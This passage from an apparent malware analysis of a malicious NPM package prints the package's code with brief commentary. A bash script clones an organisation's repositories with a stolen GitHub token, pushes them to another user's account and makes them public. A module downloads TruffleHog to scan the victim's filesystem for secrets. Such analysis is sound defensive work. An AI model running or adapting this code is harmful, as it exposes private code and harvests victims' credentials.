</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">cd</span> - &gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    rm -rf <span class="s2">&#34;</span><span class="nv">$repo_dir</span><span class="s2">/</span><span class="nv">$migration_name</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">process_repositories<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">repos</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> total_repos
</span></span><span class="line"><span class="cl">    <span class="nv">total_repos</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repos</span><span class="s2">&#34;</span> <span class="p">|</span> jq length<span class="k">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$total_repos</span><span class="s2">&#34;</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">success_count</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">failure_count</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">0</span> <span class="k">$((</span>total_repos <span class="o">-</span> <span class="m">1</span><span class="k">)))</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> repo
</span></span><span class="line"><span class="cl">        <span class="nv">repo</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repos</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s2">&#34;.[</span><span class="nv">$i</span><span class="s2">]&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> <span class="nv">migration_name</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">repo</span><span class="p">//</span><span class="se">\/</span><span class="p">/-</span><span class="si">}</span><span class="s2">-migration&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> <span class="nv">auth_source_url</span><span class="o">=</span><span class="s2">&#34;https://</span><span class="nv">$GITHUB_TOKEN</span><span class="s2">@github.com/</span><span class="nv">$repo</span><span class="s2">.git&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> <span class="nv">auth_target_url</span><span class="o">=</span><span class="s2">&#34;https://</span><span class="nv">$GITHUB_TOKEN</span><span class="s2">@github.com/</span><span class="nv">$TARGET_USER</span><span class="s2">/</span><span class="nv">$migration_name</span><span class="s2">.git&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Create target repository</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> create_repo <span class="s2">&#34;</span><span class="nv">$migration_name</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Migrate the repository</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> migrate_repo <span class="s2">&#34;</span><span class="nv">$auth_source_url</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$auth_target_url</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$migration_name</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># Make the repository public after successful migration</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> make_repo_public <span class="s2">&#34;</span><span class="nv">$migration_name</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">                    <span class="o">((</span>success_count++<span class="o">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span>
</span></span><span class="line"><span class="cl">                    <span class="o">((</span>success_count++<span class="o">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">fi</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span>
</span></span><span class="line"><span class="cl">                <span class="o">((</span>failure_count++<span class="o">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">fi</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="o">((</span>failure_count++<span class="o">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">done</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$failure_count</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">main<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> tool in curl jq git<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> ! <span class="nb">command</span> -v <span class="s2">&#34;</span><span class="nv">$tool</span><span class="s2">&#34;</span> <span class="p">&amp;</span>&gt; /dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">done</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> repos
</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! <span class="nv">repos</span><span class="o">=</span><span class="k">$(</span>get_all_repos <span class="s2">&#34;</span><span class="nv">$SOURCE_ORG</span><span class="s2">&#34;</span><span class="k">)</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Process all repositories</span>
</span></span><span class="line"><span class="cl">    process_repositories <span class="s2">&#34;</span><span class="nv">$repos</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Run main function</span>
</span></span><span class="line"><span class="cl">main <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="trufflehogmodule">TruffleHogModule</h5>
<img src="/static/NPM/image-43.png" alt="drawing" width="1000"/>
<p>The TruffleHogModule is relatively straightforward. Its primary function, scanFilesystem, executes the TruffleHog tool to scan for secrets and returns the results. The module&rsquo;s other functions handle downloading, extracting, and installing the TruffleHog tool.</p>
<img src="/static/NPM/image-15.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">TruffleHogModule</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span> <span class="o">=</span> <span class="n">getSystemInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">binaryName</span> <span class="o">=</span> <span class="s2">&#34;windows&#34;</span> <span class="o">===</span> <span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span> <span class="err">?</span> <span class="s2">&#34;trufflehog.exe&#34;</span> <span class="p">:</span> <span class="s2">&#34;trufflehog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">cwd</span><span class="p">(),</span> <span class="n">binaryName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">checkIfInstalled</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">checkIfInstalled</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">=</span> <span class="n">fs</span><span class="o">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">mapArchitecture</span><span class="p">(</span><span class="n">arch</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="n">arch</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;x64&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">default</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;amd64&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;arm64&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;arm64&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;arm&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;arm&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;x86&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;386&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">mapPlatform</span><span class="p">(</span><span class="n">platform</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="n">platform</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;windows&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;linux&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">default</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;linux&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s2">&#34;mac&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;darwin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">getLatestRelease</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="s2">&#34;https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">GitHub</span> <span class="n">API</span> <span class="n">request</span> <span class="n">failed</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">tagName</span> <span class="o">=</span> <span class="p">(</span><span class="n">await</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span><span class="o">.</span><span class="n">tag_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">version</span> <span class="o">=</span> <span class="n">tagName</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">platform</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">mapPlatform</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">fileName</span> <span class="o">=</span> <span class="err">`</span><span class="n">trufflehog_</span><span class="o">$</span><span class="p">{</span><span class="n">version</span><span class="p">}</span><span class="n">_</span><span class="o">$</span><span class="p">{</span><span class="n">platform</span><span class="p">}</span><span class="n">_</span><span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">mapArchitecture</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">architecture</span><span class="p">)}</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">version</span><span class="p">:</span> <span class="n">version</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">downloadUrl</span><span class="p">:</span> <span class="err">`</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">trufflesecurity</span><span class="o">/</span><span class="n">trufflehog</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">download</span><span class="o">/$</span><span class="p">{</span><span class="n">tagName</span><span class="p">}</span><span class="o">/$</span><span class="p">{</span><span class="n">fileName</span><span class="p">}</span><span class="err">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">fileName</span><span class="p">:</span> <span class="n">fileName</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">latest</span> <span class="n">release</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">downloadFile</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">destination</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Download</span> <span class="n">failed</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">body</span><span class="p">)</span> <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="s2">&#34;No response body&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">fs</span><span class="o">.</span><span class="n">createWriteStream</span><span class="p">(</span><span class="n">destination</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">await</span> <span class="n">pipeline</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">body</span><span class="p">,</span> <span class="n">writer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">download</span> <span class="n">file</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">extractBinary</span><span class="p">(</span><span class="n">archivePath</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">binaryName</span> <span class="o">=</span> <span class="s2">&#34;windows&#34;</span> <span class="o">===</span> <span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span> <span class="err">?</span> <span class="s2">&#34;trufflehog.exe&#34;</span> <span class="p">:</span> <span class="s2">&#34;trufflehog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">extractCommand</span> <span class="o">=</span> <span class="err">`</span><span class="n">tar</span> <span class="o">-</span><span class="n">xzf</span> <span class="s2">&#34;${archivePath}&#34;</span> <span class="o">-</span><span class="n">C</span> <span class="s2">&#34;${process.cwd()}&#34;</span> <span class="o">$</span><span class="p">{</span><span class="n">binaryName</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">execSync</span><span class="p">(</span><span class="n">extractCommand</span><span class="p">,</span> <span class="p">{</span><span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;pipe&#34;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="s2">&#34;windows&#34;</span> <span class="o">!==</span> <span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">execSync</span><span class="p">(</span><span class="err">`</span><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="s2">&#34;${this.binaryPath}&#34;</span><span class="err">`</span><span class="p">,</span> <span class="p">{</span><span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;pipe&#34;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">cleanupCommand</span> <span class="o">=</span> <span class="s2">&#34;windows&#34;</span> <span class="o">===</span> <span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span> <span class="err">?</span> <span class="err">`</span><span class="n">del</span> <span class="s2">&#34;${archivePath}&#34;</span><span class="err">`</span> <span class="p">:</span> <span class="err">`</span><span class="n">rm</span> <span class="s2">&#34;${archivePath}&#34;</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">execSync</span><span class="p">(</span><span class="n">cleanupCommand</span><span class="p">,</span> <span class="p">{</span><span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;pipe&#34;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">extract</span> <span class="n">binary</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">install</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span><span class="p">)</span> <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">release</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">getLatestRelease</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">archivePath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">cwd</span><span class="p">(),</span> <span class="n">release</span><span class="o">.</span><span class="n">fileName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            
